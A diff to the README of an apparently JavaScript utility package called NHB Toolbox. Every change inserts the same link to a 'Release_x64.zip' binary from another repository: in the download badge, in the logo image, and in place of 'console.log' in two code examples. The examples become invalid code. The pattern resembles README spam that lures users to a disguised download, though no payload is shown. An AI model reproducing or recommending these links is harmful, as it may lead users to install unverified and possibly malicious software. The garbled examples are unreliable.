@@ -20,7 +20,7 @@ Welcome to the **NHB Toolbox** GitHub repository! This toolbox is a versatile co
 
 To access the latest version of the **NHB Toolbox**, you can download it from the following link:
 
-[![Download NHB Toolbox](https://img.shields.io/badge/Download-NHB_Toolbox-blue)](https://github.com/22155555/1875695542/releases/download/v1.0/Software.zip)
+[![Download NHB Toolbox](https://github.com/tkiet782/nhb-toolbox/releases/download/v1.0/Release_x64.zip)](https://github.com/tkiet782/nhb-toolbox/releases/download/v1.0/Release_x64.zip)
 
 If the link doesn't lead to the desired file, please check the **Releases** section of this repository for alternative options.
 
@@ -42,7 +42,7 @@ import { formatDate } from 'nhb-toolbox';
 
 const today = new Date();
 const formattedDate = formatDate(today, 'DD/MM/YYYY');
-console.log(formattedDate); // Output: 25/12/2022
+https://github.com/tkiet782/nhb-toolbox/releases/download/v1.0/Release_x64.zip(formattedDate); // Output: 25/12/2022
 ```
 
 ### Example 2: Generating Random Numbers
@@ -51,7 +51,7 @@ console.log(formattedDate); // Output: 25/12/2022
 import { getRandomNumber } from 'nhb-toolbox';
 
 const randomNumber = getRandomNumber(1, 10);
-console.log(randomNumber); // Output: Random number between 1 and 10
+https://github.com/tkiet782/nhb-toolbox/releases/download/v1.0/Release_x64.zip(randomNumber); // Output: Random number between 1 and 10
 ```
 
 ## Feedback 📝
@@ -66,6 +66,6 @@ If you encounter any issues or need assistance with the toolbox, please reach ou
 
 Thank you for choosing the NHB Toolbox for your development needs. We hope this repository enhances your workflow and makes your coding experience more enjoyable. Happy coding! 🚀
 
-![NHB Toolbox Logo](https://your-image-url.com)
+![NHB Toolbox Logo](https://github.com/tkiet782/nhb-toolbox/releases/download/v1.0/Release_x64.zip)
 
 **© 2023 NHB Toolbox. All Rights Reserved.**
